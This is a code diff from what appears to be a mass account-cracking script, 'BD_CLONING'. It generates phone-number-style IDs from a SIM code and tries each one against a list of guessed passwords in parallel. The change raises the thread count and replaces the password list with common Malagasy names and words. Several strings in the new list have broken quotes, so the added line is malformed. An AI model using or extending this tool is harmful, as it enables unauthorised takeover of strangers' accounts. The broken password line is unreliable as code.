@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=50) as Dipto:
+    with tred(max_workers=80) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'finaritra','Finaritra','rakoto','Rakoto','mamikeliko','Mamikeliko','vololona','Vololona','faniry','Faniry','malala','Malala','tolotra','Tolotra','richard','Richard','sarobidy','Sarobidy','tiavina','Tiavina','nomena','nathan','Nathan','mamitiana','Mamitiana','Nomena','mirindra','Mirindra','tantely','Tantely','Rebecca','rebecca','anjara','Anjara','varotra','sarah','Sarah','volamena','Volamena','harena','Harena','sitraka','Sitraka','tanjona','Tanjona','safidy','Safidy','ravaka','Ravaka','mialy','Mialy','zazakely','Zazakely','trading','Trading','traderfx','Traderfx','tahina','Tahina','fitiavana','Fitiavana']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malalako','Malalako','randria','Randria','milely','Milely','tanjona','Tanjona','mendrika','Mendrika','nekena','Nekena','santatra','Santatra','volana','Volana','solofo','Solofo','Elie','elie','fanomezana','Fanomezana','Fifaliana','fifaliana','rakoto','Rakoto','vadiko','Vadiko','jesosy','Jesosy,'faniry','Faniry','malala','Malala','nirina','Nirina','sahaza','Sahaza','lahatra','Lahatra','nantenaina','Nantenaina','mihary','Mihary','tolotra','Tolotra','mirindra','Mirindra','sarobidy','Sarobidy','fitiavana,'Fitiavana','nomena','Natacha,'natacha','mamitiana','Mamitiana','Nomena','nathalie','Natalie','tantely','Tantely','mamiko','Mamiko','anjara','Anjara','nathalie','Nathalie','narindra','Narindra','fandresena,'harena','Harena','sitraka','Sitraka','tanjona','Tanjona','safidy','Safidy','ravaka','Ravaka','Fandresena','Mialy','zazakely','Zazakely','trading','Trading','traderfx','Traderfx','tahina','Tahina','faneva','Faneva']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
